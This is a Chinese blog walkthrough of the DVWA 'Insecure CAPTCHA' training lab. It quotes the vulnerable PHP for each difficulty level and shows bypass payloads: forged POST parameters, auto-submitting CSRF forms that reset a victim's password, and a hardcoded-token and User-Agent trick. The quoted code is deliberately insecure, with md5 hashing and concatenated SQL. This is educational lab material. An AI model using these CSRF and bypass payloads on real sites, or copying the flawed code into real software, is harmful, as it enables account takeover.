---
layout:     post
title:      dvwa之Insecure CAPTCHA Inclusion
subtitle:   dvwa的不安全验证码
date:       2020-11-17
author:     YY——阳阳
header-img: img/post/1.jpg
catalog: true
tags:
    - dvwa
    - Insecure CAPTCHA
---

## 前言
> &emsp;&emsp;Insecure CAPTCHA，意思是不安全的验证码，CAPTCHA是Completely Automated Public Turing Test to Tell Computers and Humans Apart (全自动区分计算机和人类的图灵测试)的简称。**因为这块主要是验证流程出现了逻辑漏洞**

[![cDiZCQ.png](https://z3.ax1x.com/2021/04/12/cDiZCQ.png)](https://imgtu.com/i/cDiZCQ)
## LOW
#### 源码分析
服务器通过调用recaptcha_check_answer函数检查用户输入的正确性。

    recaptcha_check_answer($privkey,$remoteip, $challenge,$response)
    $privkey是服务器申请的private key ，$remoteip是用户的ip，$challenge 是recaptcha_challenge_field 字段的值，来自前端页面 ，$response是 recaptcha_response_field 字段的值

函数返回ReCaptchaResponse class的实例，ReCaptchaResponse 类有2个属性 ：

    $is_valid是布尔型的，表示校验是否有效
    $error是返回的错误代码

```php
<?php

if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '1' ) ) {
    // Hide the CAPTCHA form
    $hide_form = true;

    // Get input
    $pass_new  = $_POST[ 'password_new' ];
    $pass_conf = $_POST[ 'password_conf' ];

    // Check CAPTCHA from 3rd party
    $resp = recaptcha_check_answer(
        $_DVWA[ 'recaptcha_private_key'],
        $_POST['g-recaptcha-response']
    );

    // Did the CAPTCHA fail?
    if( !$resp ) {
        // What happens when the CAPTCHA was entered incorrectly
        $html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>";
        $hide_form = false;
        return;
    }
    else {
        // CAPTCHA was correct. Do both new passwords match?
        if( $pass_new == $pass_conf ) {
            // Show next stage for the user
            echo "
                <pre><br />You passed the CAPTCHA! Click the button to confirm your changes.<br /></pre>
                <form action=\"#\" method=\"POST\">
                    <input type=\"hidden\" name=\"step\" value=\"2\" />
                    <input type=\"hidden\" name=\"password_new\" value=\"{$pass_new}\" />
                    <input type=\"hidden\" name=\"password_conf\" value=\"{$pass_conf}\" />
                    <input type=\"submit\" name=\"Change\" value=\"Change\" />
                </form>";
        }
        else {
            // Both new passwords do not match.
            $html     .= "<pre>Both passwords must match.</pre>";
            $hide_form = false;
        }
    }
}

if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) {
    // Hide the CAPTCHA form
    $hide_form = true;

    // Get input
    $pass_new  = $_POST[ 'password_new' ];
    $pass_conf = $_POST[ 'password_conf' ];

    // Check to see if both password match
    if( $pass_new == $pass_conf ) {
        // They do!
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $pass_new = md5( $pass_new );

        // Update database
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

        // Feedback for the end user
        echo "<pre>Password Changed.</pre>";
    }
    else {
        // Issue with the passwords matching
        echo "<pre>Passwords did not match.</pre>";
        $hide_form = false;
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?> 
```
> 可以看到，服务器将改密操作分成了两步，第一步检查用户输入的验证码，验证通过后，服务器返回表单，第二步客户端提交post请求，服务器完成更改密码的操作。但是，这其中存在明显的逻辑漏洞，服务器仅仅通过检查Change、step 参数来判断用户是否已经输入了正确的验证码。
> 
> 根据源码分析，当 isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' 时,并且是post传参数。

#### payload1
利用抓包工具，或者hackerbar都可，不过hackerbar会更加有效果。
[![cD9LKx.png](https://z3.ax1x.com/2021/04/12/cD9LKx.png)](https://imgtu.com/i/cD9LKx)

[![cDCeIg.png](https://z3.ax1x.com/2021/04/12/cDCeIg.png)](https://imgtu.com/i/cDCeIg)
#### payload2
由于没有任何防止csrf的机制，可以构造攻击界面

```html
<html>      

<body onload="document.getElementById('transfer').submit()">        

  <div>    

    <form method="POST" id="transfer" action="http://9ff7e097fa444f269fad06a67e8c148d.app.mituan.zone/vulnerabilities/captcha/">     

		<input type="hidden" name="password_new" value="password">

		<input type="hidden" name="password_conf" value="password">     

		<input type="hidden" name="step" value="2"      

		<input type="hidden" name="Change" value="Change">        

	</form>        

  </div>        

</body>

</html>
```
当受害者访问这个页面时，攻击脚本会伪造改密请求发送给服务器。

## Medium
#### 源码分析
```php
<?php

if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '1' ) ) {
    // Hide the CAPTCHA form
    $hide_form = true;

    // Get input
    $pass_new  = $_POST[ 'password_new' ];
    $pass_conf = $_POST[ 'password_conf' ];

    // Check CAPTCHA from 3rd party
    $resp = recaptcha_check_answer(
        $_DVWA[ 'recaptcha_private_key' ],
        $_POST['g-recaptcha-response']
    );

    // Did the CAPTCHA fail?
    if( !$resp ) {
        // What happens when the CAPTCHA was entered incorrectly
        $html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>";
        $hide_form = false;
        return;
    }
    else {
        // CAPTCHA was correct. Do both new passwords match?
        if( $pass_new == $pass_conf ) {
            // Show next stage for the user
            echo "
                <pre><br />You passed the CAPTCHA! Click the button to confirm your changes.<br /></pre>
                <form action=\"#\" method=\"POST\">
                    <input type=\"hidden\" name=\"step\" value=\"2\" />
                    <input type=\"hidden\" name=\"password_new\" value=\"{$pass_new}\" />
                    <input type=\"hidden\" name=\"password_conf\" value=\"{$pass_conf}\" />
                    <input type=\"hidden\" name=\"passed_captcha\" value=\"true\" />
                    <input type=\"submit\" name=\"Change\" value=\"Change\" />
                </form>";
        }
        else {
            // Both new passwords do not match.
            $html     .= "<pre>Both passwords must match.</pre>";
            $hide_form = false;
        }
    }
}

if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) {
    // Hide the CAPTCHA form
    $hide_form = true;

    // Get input
    $pass_new  = $_POST[ 'password_new' ];
    $pass_conf = $_POST[ 'password_conf' ];

    // Check to see if they did stage 1
    if( !$_POST[ 'passed_captcha' ] ) {
        $html     .= "<pre><br />You have not passed the CAPTCHA.</pre>";
        $hide_form = false;
        return;
    }

    // Check to see if both password match
    if( $pass_new == $pass_conf ) {
        // They do!
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $pass_new = md5( $pass_new );

        // Update database
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

        // Feedback for the end user
        echo "<pre>Password Changed.</pre>";
    }
    else {
        // Issue with the passwords matching
        echo "<pre>Passwords did not match.</pre>";
        $hide_form = false;
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?> 
```
这里对passed_captcha进行了验证[![cDAHRe.png](https://z3.ax1x.com/2021/04/12/cDAHRe.png)](https://imgtu.com/i/cDAHRe)
#### payload1
    step=2&password_new=123&password_conf=123&Change=Change&passed_captcha=true
[![cDEKWF.png](https://z3.ax1x.com/2021/04/12/cDEKWF.png)](https://imgtu.com/i/cDEKWF)

修改成功
[![cDEaWD.png](https://z3.ax1x.com/2021/04/12/cDEaWD.png)](https://imgtu.com/i/cDEaWD)
#### payload2
```html
<html>       

<body onload="document.getElementById('transfer').submit()">       

  <div>      

    <form method="POST" id="transfer" action="http://192.168.153.130/dvwa/vulnerabilities/captcha/">       

		<input type="hidden" name="password_new" value="password">

		<input type="hidden" name="password_conf" value="password">        

		<input type="hidden" name="passed_captcha" value="true">        

		<input type="hidden" name="step" value="2">       

		<input type="hidden" name="Change" value="Change">        

	</form>        

  </div>

</body>        

</html>
```

## High
#### 源码分析

```php
<?php

if( isset( $_POST[ 'Change' ] ) ) {
    // Hide the CAPTCHA form
    $hide_form = true;

    // Get input
    $pass_new  = $_POST[ 'password_new' ];
    $pass_conf = $_POST[ 'password_conf' ];

    // Check CAPTCHA from 3rd party
    $resp = recaptcha_check_answer(
        $_DVWA[ 'recaptcha_private_key' ],
        $_POST['g-recaptcha-response']
    );

    if (
        $resp || 
        (
            $_POST[ 'g-recaptcha-response' ] == 'hidd3n_valu3'
            && $_SERVER[ 'HTTP_USER_AGENT' ] == 'reCAPTCHA'
        )
    ){
        // CAPTCHA was correct. Do both new passwords match?
        if ($pass_new == $pass_conf) {
            $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
            $pass_new = md5( $pass_new );

            // Update database
            $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "' LIMIT 1;";
            $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

            // Feedback for user
            echo "<pre>Password Changed.</pre>";

        } else {
            // Ops. Password mismatch
            $html     .= "<pre>Both passwords must match.</pre>";
            $hide_form = false;
        }

    } else {
        // What happens when the CAPTCHA was entered incorrectly
        $html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>";
        $hide_form = false;
        return;
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

// Generate Anti-CSRF token
generateSessionToken();

?> 
```
> 可以看到，服务器的验证逻辑是当$resp（这里是指谷歌返回的验证结果）是true，并且参数recaptcha_response_field等于hidd3n_valu3（或者http包头的User-Agent参数等于reCAPTCHA）时，就认为验证码输入正确，反之则认为未通过验证码的检查。
> 并且最后验证了token；generateSessionToken(); 

#### payload
由于无法控制resp参数值，因此修改参数recaptcha_response_field、User-Agent

首先hackerbar看看情况（因为这里么有验证码修改，所以没法抓包看信息）得到了token值，一会用得上
[![cDZPDs.png](https://z3.ax1x.com/2021/04/12/cDZPDs.png)](https://imgtu.com/i/cDZPDs)

```php
step=2&password_new=password&password_conf=password&Change=Change&recaptcha_response_field=hidd3n_valu3&user_token=653a55203382fddfaa0570d59aeffe31
```
[![cDeeot.png](https://z3.ax1x.com/2021/04/12/cDeeot.png)](https://imgtu.com/i/cDeeot)

## Impossible
#### 源码分析
```php
<?php

if( isset( $_POST[ 'Change' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Hide the CAPTCHA form
    $hide_form = true;

    // Get input
    $pass_new  = $_POST[ 'password_new' ];
    $pass_new  = stripslashes( $pass_new );
    $pass_new  = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $pass_new  = md5( $pass_new );

    $pass_conf = $_POST[ 'password_conf' ];
    $pass_conf = stripslashes( $pass_conf );
    $pass_conf = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_conf ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $pass_conf = md5( $pass_conf );

    $pass_curr = $_POST[ 'password_current' ];
    $pass_curr = stripslashes( $pass_curr );
    $pass_curr = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_curr ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $pass_curr = md5( $pass_curr );

    // Check CAPTCHA from 3rd party
    $resp = recaptcha_check_answer(
        $_DVWA[ 'recaptcha_private_key' ],
        $_POST['g-recaptcha-response']
    );

    // Did the CAPTCHA fail?
    if( !$resp ) {
        // What happens when the CAPTCHA was entered incorrectly
        echo "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>";
        $hide_form = false;
        return;
    }
    else {
        // Check that the current password is correct
        $data = $db->prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );
        $data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );
        $data->bindParam( ':password', $pass_curr, PDO::PARAM_STR );
        $data->execute();

        // Do both new password match and was the current password correct?
        if( ( $pass_new == $pass_conf) && ( $data->rowCount() == 1 ) ) {
            // Update the database
            $data = $db->prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' );
            $data->bindParam( ':password', $pass_new, PDO::PARAM_STR );
            $data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );
            $data->execute();

            // Feedback for the end user - success!
            echo "<pre>Password Changed.</pre>";
        }
        else {
            // Feedback for the end user - failed!
            echo "<pre>Either your current password is incorrect or the new passwords did not match.<br />Please try again.</pre>";
            $hide_form = false;
        }
    }
}

// Generate Anti-CSRF token
generateSessionToken();

?> 
```
利用了[PDO技术](https://blog.csdn.net/jiuyue9561/article/details/80379910)防护sql注入，验证过程不是两部分了，验证码无法进行绕过，同时要求用户输入之前的密码。


## 参考资料
https://www.freebuf.com/articles/web/119692.html

https://blog.csdn.net/jiuyue9561/article/details/80379910